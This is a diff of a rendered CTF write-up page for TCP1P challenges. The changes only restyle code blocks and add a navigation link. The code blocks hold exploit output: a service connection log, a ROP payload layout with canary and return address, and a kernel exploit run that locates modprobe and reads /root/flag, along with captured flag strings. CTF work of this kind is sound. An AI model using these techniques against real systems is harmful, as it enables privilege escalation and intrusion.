+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">flag</span> <span class="n">loaded</span> <span class="n">into</span> <span class="n">memory</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Data</span><span class="p">:</span> <span class="n">TCP1P</span><span class="p">{</span><span class="n">k4mu_m4kan_ap4_1ni_k0q_un1qu3_s3k4li_yh_k4kung_chef_0ma1good_r3cyle</span><span class="err">???</span><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
@@ -2027,12 +2029,12 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[+] Opening connection to ctf.tcp1p.com on port 6666: Done
-</span></span><span class="line"><span class="cl">[*] Switching to interactive mode
-</span></span><span class="line"><span class="cl">YES
-</span></span><span class="line"><span class="cl">Gift for you: *(0x520690)
-</span></span><span class="line"><span class="cl">Ayame  cuteeee$ cat flag.txt
-</span></span><span class="line"><span class="cl">TCP1P{Ojou_sama_no_giggles_cuteness_overload_kawayoooooo!}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">ctf</span><span class="o">.</span><span class="n">tcp1p</span><span class="o">.</span><span class="n">com</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">6666</span><span class="p">:</span> <span class="n">Done</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="n">YES</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gift</span> <span class="k">for</span> <span class="n">you</span><span class="p">:</span> <span class="o">*</span><span class="p">(</span><span class="mh">0x520690</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ayame</span>  <span class="n">cuteeee</span><span class="o">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">TCP1P</span><span class="p">{</span><span class="n">Ojou_sama_no_giggles_cuteness_overload_kawayoooooo</span><span class="o">!</span><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
@@ -2325,19 +2327,19 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ROP_payload_1 (0x28 bytes)
-</span></span><span class="line"><span class="cl">canary
-</span></span><span class="line"><span class="cl">rbp
-</span></span><span class="line"><span class="cl">ret
-</span></span><span class="line"><span class="cl">ROP_payload_2 (0x28 bytes)
-</span></span><span class="line"><span class="cl">canary
-</span></span><span class="line"><span class="cl">rbp
-</span></span><span class="line"><span class="cl">ret
-</span></span><span class="line"><span class="cl">ROP_payload_3 (0x28 bytes)
-</span></span><span class="line"><span class="cl">canary
-</span></span><span class="line"><span class="cl">rbp
-</span></span><span class="line"><span class="cl">ret
-</span></span><span class="line"><span class="cl">...
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">ROP_payload_1</span> <span class="p">(</span><span class="mh">0x28</span> <span class="n">bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">ROP_payload_2</span> <span class="p">(</span><span class="mh">0x28</span> <span class="n">bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">ROP_payload_3</span> <span class="p">(</span><span class="mh">0x28</span> <span class="n">bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>One important note is that the last 8 byte of our ROP_payload need to pop 3 values, so that we can continue to our next ROP payload.</p>
@@ -2865,19 +2867,19 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">blud@tcp1p:~$ ./exploit
-</span></span><span class="line"><span class="cl">./exploit
-</span></span><span class="line"><span class="cl">Hello World!
-</span></span><span class="line"><span class="cl">[   44.416653] Invalid address to load
-</span></span><span class="line"><span class="cl">[   44.417229] Invalid address to load
-</span></span><span class="line"><span class="cl">FOUND modprobe: 0xffffffffb5452420
-</span></span><span class="line"><span class="cl">/home/blud/pwn: line 1: ޭ��: not found
-</span></span><span class="line"><span class="cl">blud@tcp1p:~$ ls /root
-</span></span><span class="line"><span class="cl">ls /root
-</span></span><span class="line"><span class="cl">flag
-</span></span><span class="line"><span class="cl">blud@tcp1p:~$ cat /root/flag
-</span></span><span class="line"><span class="cl">cat /root/flag
-</span></span><span class="line"><span class="cl">TCP1P{WHY_DID_YALL_LET_HIM_COOK_!!!!😭😭😭}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">blud</span><span class="err">@</span><span class="n">tcp1p</span><span class="p">:</span><span class="o">~$</span> <span class="o">./</span><span class="n">exploit</span>
+</span></span><span class="line"><span class="cl"><span class="o">./</span><span class="n">exploit</span>
+</span></span><span class="line"><span class="cl"><span class="n">Hello</span> <span class="ne">World</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span>   <span class="mf">44.416653</span><span class="p">]</span> <span class="n">Invalid</span> <span class="n">address</span> <span class="n">to</span> <span class="nb">load</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span>   <span class="mf">44.417229</span><span class="p">]</span> <span class="n">Invalid</span> <span class="n">address</span> <span class="n">to</span> <span class="nb">load</span>
+</span></span><span class="line"><span class="cl"><span class="n">FOUND</span> <span class="n">modprobe</span><span class="p">:</span> <span class="mh">0xffffffffb5452420</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">blud</span><span class="o">/</span><span class="n">pwn</span><span class="p">:</span> <span class="n">line</span> <span class="mi">1</span><span class="p">:</span> <span class="err">ޭ��</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
+</span></span><span class="line"><span class="cl"><span class="n">blud</span><span class="err">@</span><span class="n">tcp1p</span><span class="p">:</span><span class="o">~$</span> <span class="n">ls</span> <span class="o">/</span><span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">ls</span> <span class="o">/</span><span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">blud</span><span class="err">@</span><span class="n">tcp1p</span><span class="p">:</span><span class="o">~$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">TCP1P</span><span class="p">{</span><span class="n">WHY_DID_YALL_LET_HIM_COOK_</span><span class="o">!!!!</span><span class="err">😭😭😭</span><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
@@ -4190,7 +4192,8 @@
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/blackhat-mea-ctf-2023/" class="prev" rel="prev" title="BlackHat MEA CTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>BlackHat MEA CTF 2023</a></div>
+    <div class="post-nav"><a href="/posts/blackhat-mea-ctf-2023/" class="prev" rel="prev" title="BlackHat MEA CTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>BlackHat MEA CTF 2023</a>
+            <a href="/posts/cyber-jawara-2023/" class="next" rel="next" title="Cyber Jawara 2023 Writeup">Cyber Jawara 2023 Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
